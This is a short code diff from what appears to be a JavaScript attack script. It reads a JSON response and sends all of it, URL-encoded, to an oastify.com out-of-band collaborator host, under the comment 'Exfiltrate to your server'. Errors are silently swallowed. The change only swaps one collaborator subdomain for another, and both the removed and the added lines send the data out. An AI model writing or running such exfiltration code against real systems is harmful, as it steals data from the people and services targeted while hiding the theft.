@@ -6,7 +6,7 @@
     const json = await res.json();
 
     // Exfiltrate to your server
-    fetch("https://kay8auhq82ywubxdyptl0xwkwb22qtei.oastify.com/collect?data=" + encodeURIComponent(JSON.stringify(json)));
+    fetch("https://eo62oovkmwcq85b7cj7feraea5gw4osd.oastify.com/collect?data=" + encodeURIComponent(JSON.stringify(json)));
   } catch (e) {
     // Optional: silently fail
   }
